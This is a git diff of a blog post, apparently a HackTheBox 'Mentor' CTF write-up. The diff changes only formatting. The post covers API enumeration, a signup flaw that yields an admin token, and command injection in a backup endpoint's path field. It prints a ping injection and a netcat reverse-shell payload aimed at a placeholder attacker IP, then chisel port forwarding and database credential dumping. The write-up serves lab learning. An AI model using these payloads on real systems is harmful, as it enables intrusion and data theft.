@@ -6,8 +6,8 @@ date: 2022-12-11
 image: hackthebox-mentor-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -53,7 +53,7 @@ ff02::2 ip6-allrouters
 
 There is a `simple` web page, nothing much to do, I also try `dirbusting` but nothing found.
 
-<FixTheImageURL src='web.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-mentor-writeup" />
 
 Let's try to `fuzz` the new subdomain with `wfuzz`
 
@@ -99,7 +99,7 @@ ff02::2 ip6-allrouters
 
 There is `404` page, nothing much, let's try `dirbusting` to find some new endpoint.
 
-<FixTheImageURL src='web1.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-mentor-writeup" />
 
 Found some `interesting endpoints` Let's go there one by one
 
@@ -136,39 +136,39 @@ server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration:
 
 `/admin` Tell us we need to `authenticate` first to access this `endpoint`.
 
-<FixTheImageURL src='web2.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-mentor-writeup" />
 
 `/docs` Tell us pretty much `everything` about every `endpoint` which is created on top of `swagger` module.
 
-<FixTheImageURL src='web3.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web3.png" slug="hackthebox-mentor-writeup" />
 
 And we also see that the owner of the website is `james` and his email is `james@mentorquotes.htb`
 
-<FixTheImageURL src='web4.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-mentor-writeup" />
 
 Let's try to `sign up` with help of documentation, but I like working in `burp`, so I capture the request in `burp`.
 
-<FixTheImageURL src='web5.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web5.png" slug="hackthebox-mentor-writeup" />
 
 Created the `account` with random `creads`.
 
-<FixTheImageURL src='burp.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp.png" slug="hackthebox-mentor-writeup" />
 
 Now, let's also `capture` the login endpoint request in `burp`.
 
-<FixTheImageURL src='web6.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web6.png" slug="hackthebox-mentor-writeup" />
 
 And we got the `JWT` token.
 
-<FixTheImageURL src='burp1.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp1.png" slug="hackthebox-mentor-writeup" />
 
 I also capture the request of `/users` endpoint in burp, which will give the all `users` list.
 
-<FixTheImageURL src='web7.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web7.png" slug="hackthebox-mentor-writeup" />
 
 But no `luck` this time, we got the `403` forbidden error which tell us that only `admin` can access this resource.
 
-<FixTheImageURL src='burp2.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp2.png" slug="hackthebox-mentor-writeup" />
 
 Let's `play` with the `/signup` endpoint.
 
@@ -176,55 +176,55 @@ First I try to register with `james` user with his `email` which is `admin` of t
 
 But that's not working.
 
-<FixTheImageURL src='burp3.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp3.png" slug="hackthebox-mentor-writeup" />
 
 Now I change the email to that `email` which we `register` first time, and this time it's working.
 
-<Callout emoji='💡'>
-    It's mean that it's only validating the email that can't be registered more
-    than one time but this is not the same case with username.
+<Callout emoji="💡">
+  It's mean that it's only validating the email that can't be registered more than one time but this is not the same
+  case with username.
 </Callout>
 
-<FixTheImageURL src='burp4.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp4.png" slug="hackthebox-mentor-writeup" />
 
 Now I try to `log in` with that same `creads` and we got the `JWT` token.
 
-<FixTheImageURL src='burp5.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp5.png" slug="hackthebox-mentor-writeup" />
 
 And this time we got the `users` list.
 
-<FixTheImageURL src='burp6.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp6.png" slug="hackthebox-mentor-writeup" />
 
 If you `remember` we found one endpoint called `/admin` which require authentication, let's try this `token` with that endpoint.
 
 And it's works we got `2` new `endpoints`
 
--   /check
--   /backup
+- /check
+- /backup
 
-<FixTheImageURL src='burp7.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp7.png" slug="hackthebox-mentor-writeup" />
 
 The `/check` endpoint is not `implemented` yet.
 
-<FixTheImageURL src='burp8.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp8.png" slug="hackthebox-mentor-writeup" />
 
 But the `/backup` endpoint tell us that the `GET` method is not allowed.
 
 Let's `change` the method of request.
 
-<FixTheImageURL src='burp9.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp9.png" slug="hackthebox-mentor-writeup" />
 
 And it's tell us it's want `JSON` object with `body` attribute
 
-<FixTheImageURL src='burp10.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp10.png" slug="hackthebox-mentor-writeup" />
 
 I add the empty `JSON` object and change the content type to `application/json` which give one more attribute to specify called `path`.
 
-<FixTheImageURL src='burp11.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp11.png" slug="hackthebox-mentor-writeup" />
 
 When I give both `attribute` it gives success message called `Done!``
 
-<FixTheImageURL src='burp12.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp12.png" slug="hackthebox-mentor-writeup" />
 
 Let's try basic `command injection` with `ping` command, but first let's start the `tcpdump`.
 
@@ -238,25 +238,25 @@ Try a basic `technique` of command injection with `;`
 
 ```json
 {
-    "body": "dedsec",
-    "path": "/etc/passwd;ping -c 2 10.10.XX.XX;"
+  "body": "dedsec",
+  "path": "/etc/passwd;ping -c 2 10.10.XX.XX;"
 }
 ```
 
 Let's send the `request` and check the `tcpdump`.
 
-<FixTheImageURL src='burp13.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="burp13.png" slug="hackthebox-mentor-writeup" />
 
 And we got the `ping` back
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-mentor-writeup" />
 
 Let's try to get the `rev` shell.
 
 ```json
 {
-    "body": "dedsec",
-    "path": "/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.XX.XX 9001 >/tmp/f;"
+  "body": "dedsec",
+  "path": "/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.XX.XX 9001 >/tmp/f;"
 }
 ```
 
@@ -350,7 +350,7 @@ For interacting with `PostgreSQL` database, we need to forward the port with `ch
 
 Let's transfer the `chisel` binary.
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="cmd1.png" slug="hackthebox-mentor-writeup" />
 
 Let's start the `chisel` server on our `kali` box.
 
@@ -366,7 +366,7 @@ chmod +x chisel
 ./chisel client -v 10.10.XX.XX:9002 R:5432:172.22.0.1:5432
 ```
 
-<FixTheImageURL src='cmd2.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="cmd2.png" slug="hackthebox-mentor-writeup" />
 
 Let's connect the `PostgreSQL` database.
 
@@ -415,7 +415,7 @@ mentorquotes_db=# select * from users;
 
 Crack the hash with `crackstation` and we got the `svc` user password called `123meunomeeivani`
 
-<FixTheImageURL src='web8.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="web8.png" slug="hackthebox-mentor-writeup" />
 
 And we got the `user.txt` file.
 
@@ -467,7 +467,7 @@ Running the `linPEAS` and we got the `SNMP` config file.
 
 And we also see that it's `created` recently.
 
-<FixTheImageURL src='cmd3.png' slug='hackthebox-mentor-writeup' />
+<FixTheImageURL src="cmd3.png" slug="hackthebox-mentor-writeup" />
 
 And we also see that `SNMP` default port is open
 
